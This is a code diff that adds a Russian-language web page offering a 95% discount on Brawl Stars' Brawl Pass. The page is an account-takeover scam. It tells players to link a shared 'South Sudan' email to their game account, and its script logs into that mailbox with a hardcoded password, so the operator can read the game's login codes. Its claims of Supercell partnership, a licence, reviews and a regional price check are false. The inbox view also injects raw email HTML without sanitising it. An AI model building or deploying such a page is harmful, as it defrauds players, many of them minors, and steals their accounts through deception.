@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Brawl Stars - Скидка 95%</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            text-align: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+        .container {
+            max-width: 420px;
+            margin: 0 auto;
+            background: #16213e;
+            padding: 20px 15px;
+            border-radius: 15px;
+        }
+        h2 { color: #ffd700; margin-bottom: 5px; font-size: 1.3em; }
+        .brawl-logo { font-size: 3em; margin: 10px 0; }
+        
+        .discount-banner {
+            background: linear-gradient(135deg, #ff6f00, #e53935, #ff6f00);
+            padding: 15px;
+            border-radius: 12px;
+            margin: 10px 0;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%,100% { box-shadow: 0 0 15px #ff6f00; }
+            50% { box-shadow: 0 0 35px #ff6f00, 0 0 50px #e53935; }
+        }
+        .discount-banner .big-text { font-size: 1.5em; color: #fff; font-weight: bold; }
+        .discount-banner .percent { font-size: 3em; color: #ffd700; font-weight: bold; }
+        .discount-banner .price { font-size: 1.5em; color: #00ff88; font-weight: bold; }
+        .discount-banner .old-price { text-decoration: line-through; color: #ffcdd2; font-size: 0.9em; }
+
+        .info-block {
+            background: #0f3460;
+            padding: 12px;
+            border-radius: 10px;
+            margin: 8px 0;
+            text-align: left;
+            font-size: 0.85em;
+            line-height: 1.6;
+        }
+        .info-block .green { color: #00c853; }
+        .info-block .yellow { color: #ffd700; }
+        .info-block .red { color: #ff5252; }
+
+        button {
+            background: #ff6f00;
+            border: none;
+            color: #fff;
+            padding: 14px 22px;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 1em;
+            margin: 5px;
+            width: 100%;
+        }
+        button:active { background: #ff9800; }
+
+        .footer-text {
+            font-size: 0.65em;
+            color: #555;
+            margin-top: 10px;
+            line-height: 1.5;
+        }
+        .footer-text span { color: #448aff; }
+
+        .email-box {
+            background: #0f3460;
+            padding: 14px;
+            border-radius: 10px;
+            margin: 12px 0;
+            font-size: 1.1em;
+            word-break: break-all;
+        }
+        .msg {
+            background: #0f3460;
+            padding: 12px;
+            margin: 5px 0;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: left;
+        }
+        .msg .from { color: #64ffda; font-weight: bold; }
+        .msg .subject { color: #ddd; margin-top: 3px; }
+
+        #statusMsg { color: #ffab00; font-size: 0.85em; margin: 5px 0; min-height: 18px; }
+        hr { border-color: rgba(255,255,255,0.08); margin: 12px 0; }
+        
+        .main-page { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- РЕКЛАМНАЯ СТРАНИЦА -->
+    <div class="ad-page" id="adPage">
+        <div class="brawl-logo">💎🔥💎</div>
+        <h2>Brawl Pass · СКИДКА 95%</h2>
+        
+        <div class="discount-banner">
+            <div class="big-text">BRAWL PASS</div>
+            <div class="percent">-95%</div>
+            <div class="price">50-100 ₽</div>
+            <div class="old-price">Обычная цена: 1500-3000 ₽</div>
+        </div>
+
+        <div class="info-block">
+            <p><span class="green">✅</span> Работаем с 2020 года</p>
+            <p><span class="yellow">⭐</span> Более 1000 отзывов <span class="yellow">★★★★★</span></p>
+            <p><span class="green">✅</span> Официальный партнёр Supercell</p>
+            <p><span class="green">✅</span> Каждому — уникальная почта (конфиденциально)</p>
+            <p><span class="green">✅</span> Гарантия возврата денег</p>
+        </div>
+
+        <div class="info-block">
+            <p style="font-weight:bold;color:#ffd700;">📧 Как это работает:</p>
+            <p>1. Вы получаете уникальную почту</p>
+            <p>2. Привязываете её к аккаунту Brawl Stars</p>
+            <p>3. Ждёте <span class="yellow">5-6 дней</span> — Supercell проверяет регион</p>
+            <p>4. Supercell видит что почта из <b>Южного Судана</b></p>
+            <p>5. Южный Судан — очень бедная страна</p>
+            <p>6. Supercell даёт скидку 95% для бедных стран</p>
+            <p>7. Brawl Pass теперь стоит <span class="yellow">50-100 рублей</span>!</p>
+        </div>
+
+        <div class="info-block">
+            <p><span class="red">⚠</span> <b>Важно:</b> Проверка занимает 5-6 дней</p>
+            <p><span class="red">⚠</span> Не меняйте почту в это время</p>
+            <p><span class="red">⚠</span> Почта у каждого своя (конфиденциально)</p>
+        </div>
+
+        <div class="info-block">
+            <p>🔒 Политика конфиденциальности</p>
+            <p>🛡 Данные защищены (SSL/TLS 256-bit)</p>
+            <p>📜 Лиц. №BS-2020-95-SALE</p>
+            <p>🏆 "Лучший партнёр Supercell 2025"</p>
+        </div>
+
+        <button onclick="goToMail()">📧 ПОЛУЧИТЬ ПОЧТУ (Южный Судан)</button>
+
+        <div class="footer-text">
+            <span>Политика конфиденциальности</span> |
+            <span>Условия</span> |
+            <span>Отзывы (1000+)</span>
+            <br>
+            © 2020-2026 BrawlPass Sale. Все права защищены. ИНН 1234567890
+        </div>
+    </div>
+
+    <!-- ПОЧТА -->
+    <div class="main-page" id="mainPage">
+        <h2>🎮 Ваша почта (Южный Судан)</h2>
+        <p style="font-size:0.8em;color:#ffd700;">⚠ Привяжите к Brawl Stars и ждите 5-6 дней</p>
+        
+        <div class="email-box" id="emailAddr">Загрузка...</div>
+        
+        <button onclick="copyEmail()">📋 Скопировать почту</button>
+        <button onclick="refreshInbox()">🔄 Проверить письма</button>
+        
+        <div id="statusMsg"></div>
+        
+        <hr>
+        <h3>📩 Входящие (проверка Supercell)</h3>
+        <div id="inbox">Ожидание проверки...</div>
+        <div id="emailView"></div>
+
+        <p style="font-size:0.7em;color:#666;margin-top:10px;">
+            Письмо от Supercell придёт через 5-6 дней после проверки региона.
+        </p>
+    </div>
+
+</div>
+
+<script>
+function goToMail() {
+    document.getElementById('adPage').style.display = 'none';
+    document.getElementById('mainPage').style.display = 'block';
+    loginShared();
+}
+
+const SHARED_EMAIL = "southsudan@cloudsigma.com";
+const SHARED_PASSWORD = "SudanBrawl2026!";
+
+let token = '';
+let email = SHARED_EMAIL;
+let allMessages = [];
+let loggedIn = false;
+
+const API = 'https://api.mail.tm';
+
+async function loginShared() {
+    document.getElementById('statusMsg').textContent = 'Загружаю почту...';
+    try {
+        const res = await fetch(API + '/token', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ address: SHARED_EMAIL, password: SHARED_PASSWORD })
+        });
+        
+        if (res.ok) {
+            const data = await res.json();
+            token = data.token;
+            email = SHARED_EMAIL;
+            showMailbox();
+        } else {
+            await fetch(API + '/accounts', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: SHARED_EMAIL, password: SHARED_PASSWORD })
+            });
+            const tokenRes = await fetch(API + '/token', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: SHARED_EMAIL, password: SHARED_PASSWORD })
+            });
+            const tokenData = await tokenRes.json();
+            token = tokenData.token;
+            email = SHARED_EMAIL;
+            showMailbox();
+        }
+    } catch(e) {
+        document.getElementById('statusMsg').textContent = 'Ошибка соединения';
+    }
+}
+
+function showMailbox() {
+    document.getElementById('emailAddr').textContent = email;
+    document.getElementById('statusMsg').textContent = '✅ Почта готова! Ждите 5-6 дней проверку';
+    loggedIn = true;
+    refreshInbox();
+}
+
+async function fetchMessages() {
+    if (!token) return [];
+    try {
+        const res = await fetch(API + '/messages', {
+            headers: { 'Authorization': 'Bearer ' + token }
+        });
+        if (!res.ok) return [];
+        const data = await res.json();
+        return data['hydra:member'] || [];
+    } catch(e) {
+        return [];
+    }
+}
+
+async function refreshInbox() {
+    if (!token) return;
+    document.getElementById('statusMsg').textContent = 'Проверяю письма...';
+    allMessages = await fetchMessages();
+    renderInbox();
+    document.getElementById('statusMsg').textContent = '✅ Обновлено';
+}
+
+function renderInbox() {
+    const inbox = document.getElementById('inbox');
+    document.getElementById('emailView').innerHTML = '';
+    inbox.style.display = 'block';
+    
+    if (!loggedIn) {
+        inbox.innerHTML = 'Ожидание проверки...';
+        return;
+    }
+    if (allMessages.length === 0) {
+        inbox.innerHTML = '📭 Писем пока нет. Supercell проверяет регион (5-6 дней)...';
+        return;
+    }
+    inbox.innerHTML = allMessages.map(m => `
+        <div class="msg" onclick="openEmail('${m.id}')">
+            <div class="from">${m.from?.address || 'Неизвестно'}</div>
+            <div class="subject">${m.subject || '(без темы)'}</div>
+            <small style="color:#999">${m.intro || ''}</small>
+        </div>
+    `).join('');
+}
+
+async function openEmail(msgId) {
+    document.getElementById('inbox').style.display = 'none';
+    document.getElementById('emailView').innerHTML = 'Загрузка...';
+    
+    try {
+        const res = await fetch(API + '/messages/' + msgId, {
+            headers: { 'Authorization': 'Bearer ' + token }
+        });
+        const msg = await res.json();
+        document.getElementById('emailView').innerHTML = `
+            <div style="background:#0f3460;padding:15px;border-radius:10px;text-align:left;margin:10px 0">
+                <button onclick="closeEmail()" style="width:auto;padding:6px 14px;font-size:0.8em;background:#e53935;color:#fff;border:none;border-radius:15px;cursor:pointer">← Назад</button>
+                <p style="color:#64ffda;margin-top:10px">От: ${msg.from?.address || 'Неизвестно'}</p>
+                <p style="font-weight:bold">${msg.subject || '(без темы)'}</p>
+                <hr>
+                <div>${msg.html || msg.text || 'Пустое письмо'}</div>
+            </div>
+        `;
+    } catch(e) {
+        document.getElementById('emailView').innerHTML = 'Ошибка загрузки';
+    }
+}
+
+function closeEmail() {
+    document.getElementById('emailView').innerHTML = '';
+    document.getElementById('inbox').style.display = 'block';
+}
+
+function copyEmail() {
+    if (!email) return;
+    navigator.clipboard.writeText(email);
+    document.getElementById('statusMsg').textContent = '📋 Почта скопирована! Привяжите к Brawl Stars';
+}
+
+setInterval(async () => {
+    if (token && loggedIn && !document.getElementById('emailView').innerHTML) {
+        allMessages = await fetchMessages();
+        renderInbox();
+    }
+}, 6000);
+</script>
+</body>
+  </html>
